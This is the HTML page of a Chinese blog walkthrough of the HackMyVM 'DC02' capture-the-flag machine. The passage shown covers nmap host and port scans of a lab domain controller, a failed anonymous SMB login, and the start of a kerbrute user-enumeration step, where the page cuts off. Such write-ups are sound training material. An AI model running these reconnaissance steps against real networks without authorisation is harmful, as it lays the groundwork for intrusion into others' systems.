<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">HackMyVM - DC02 | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="DC02. https://hackmyvm.eu/machines/machine.php?vm=DC02 Notes: Second DC from me. Enjoy it. 信息打点 渗透 SMB 无任何凭据和线索，只能从SMB开始 当头一棒，不能使用匿名帐户，所以LDAP枚举用户也不能成功..." data-next-head=""/><meta property="og:title" content="HackMyVM - DC02 | Sunset Blog" data-next-head=""/><meta property="og:description" content="DC02. https://hackmyvm.eu/machines/machine.php?vm=DC02 Notes: Second DC from me. Enjoy it. 信息打点 渗透 SMB 无任何凭据和线索，只能从SMB开始 当头一棒，不能使用匿名帐户，所以LDAP枚举用户也不能成功..." data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top/2025/04/03/HackMyVMDC02" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-03" data-next-head=""/><meta property="article:modified_time" content="2025-04-03" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="HackMyVM" data-next-head=""/><meta property="article:tag" content="Linux靶机" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackMyVM - DC02" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top/2025/04/03/HackMyVMDC02" data-next-head=""/><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><link rel="preload" href="/_next/static/css/f055e431c58b907b.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-04-03","description":"DC02. https://hackmyvm.eu/machines/machine.php?vm=DC02 Notes: Second DC from me. Enjoy it. 信息打点 渗透 SMB 无任何凭据和线索，只能从SMB开始 当头一棒，不能使用匿名帐户，所以LDAP枚举用户也不能成功...","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.sunsetaction.top/2025/04/03/HackMyVMDC02"},"headline":"HackMyVM - DC02","image":["https://www.sunsetaction.top/images/logo.png"],"dateModified":"2025-04-03","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://www.sunsetaction.top/images/logo.png"}}}</script><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><link rel="stylesheet" href="/_next/static/css/f055e431c58b907b.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-4c7ff0ae52612d94.js" defer=""></script><script src="/_next/static/yBQJLYy5vKYVdUmksNnT4/_buildManifest.js" defer=""></script><script src="/_next/static/yBQJLYy5vKYVdUmksNnT4/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">HackMyVM - DC02</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-03</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-03<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><a href="/tag/HackMyVM/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">HackMyVM</span></a><a href="/tag/Linux%E9%9D%B6%E6%9C%BA/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">Linux靶机</span></a></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMDC02","contentHtml":"\u003ch1\u003eDC02.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=DC02\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=DC02\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes: \u003cstrong\u003eSecond DC from me. Enjoy it.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e信息打点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e// 寻找靶机IP \u003cspan class=\"hljs-number\"\u003e126\u003c/span\u003e\nnmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                            \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00044\u003c/span\u003es latency).\nMAC Address: 0A:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00049\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e:3D:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00028\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:C5:0F (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up.\nNmap done: \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e IP addresses (\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e27.99\u003c/span\u003e seconds\n\n// 端口扫描\nnmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e EST\nStrange read error \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e104\u003c/span\u003e - \u003cspan class=\"hljs-string\"\u003e'Connection reset by peer'\u003c/span\u003e)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.0014\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65518\u003c/span\u003e filtered tcp ports (no-response)\nPORT      STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e/tcp    \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  domain\n\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e/tcp    \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  kerberos-sec\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  msrpc\n\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  netbios-ssn\n\u003cspan class=\"hljs-number\"\u003e389\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ldap\n\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  microsoft-ds\n\u003cspan class=\"hljs-number\"\u003e464\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  kpasswd5\n\u003cspan class=\"hljs-number\"\u003e593\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http-rpc-epmap\n\u003cspan class=\"hljs-number\"\u003e636\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ldapssl\n\u003cspan class=\"hljs-number\"\u003e3268\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  globalcatLDAP\n\u003cspan class=\"hljs-number\"\u003e3269\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  globalcatLDAPssl\n\u003cspan class=\"hljs-number\"\u003e5985\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  wsman\n\u003cspan class=\"hljs-number\"\u003e9389\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  adws\n\u003cspan class=\"hljs-number\"\u003e49664\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  unknown\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:C5:0F (Oracle VirtualBox virtual NIC)\n\n// 服务版本扫描\nnmap -sT -sV -O -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e                              \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e                                                                                                                          \nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00074\u003c/span\u003es latency).                                                \nNot shown: \u003cspan class=\"hljs-number\"\u003e65517\u003c/span\u003e filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e/tcp    \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  domain        Simple DNS Plus\n\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e/tcp    \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  kerberos-sec  Microsoft Windows Kerberos (server time: \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:28Z)                                                                 \n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  msrpc         Microsoft Windows RPC\n\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  netbios-ssn   Microsoft Windows netbios-ssn                   \n\u003cspan class=\"hljs-number\"\u003e389\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           \n\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  microsoft-ds?\n\u003cspan class=\"hljs-number\"\u003e464\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  kpasswd5?\n\u003cspan class=\"hljs-number\"\u003e593\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ncacn_http    Microsoft Windows RPC over HTTP \u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e             \n\u003cspan class=\"hljs-number\"\u003e636\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  tcpwrapped\n\u003cspan class=\"hljs-number\"\u003e3268\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           \n\u003cspan class=\"hljs-number\"\u003e3269\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  tcpwrapped\n\u003cspan class=\"hljs-number\"\u003e5985\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http          Microsoft HTTPAPI httpd \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e (SSDP/UPnP)         \n\u003cspan class=\"hljs-number\"\u003e9389\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  mc-nmf        .NET Message Framing                                                     \n\u003cspan class=\"hljs-number\"\u003e49674\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ncacn_http    Microsoft Windows RPC over HTTP \u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e                                   \nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:C5:0F (Oracle VirtualBox virtual NIC)                \nWarning: OSScan results may be unreliable because we could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port                                                        \nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e2016\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%)\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10      \nAggressive OS guesses: Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2016\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e91\u003c/span\u003e%), Microsoft Windows \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e 21H2 (\u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e%), Microsoft Windows \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e86\u003c/span\u003e%) \nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (test conditions non-ideal).                     \nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e渗透\u003c/h2\u003e\n\u003ch3\u003eSMB\u003c/h3\u003e\n\u003cp\u003e无任何凭据和线索，只能从SMB开始\u003c/p\u003e\n\u003cp\u003e当头一棒，不能使用匿名帐户，所以\u003ccode\u003eLDAP\u003c/code\u003e枚举用户也不能成功了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esmbclient -L \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e                                                    \nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\root]:\nsession setup failed: NT_STATUS_ACCESS_DENIED\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e域内用户枚举\u003c/h3\u003e\n\u003cp\u003e使用\u003ccode\u003ekerbrute\u003c/code\u003e 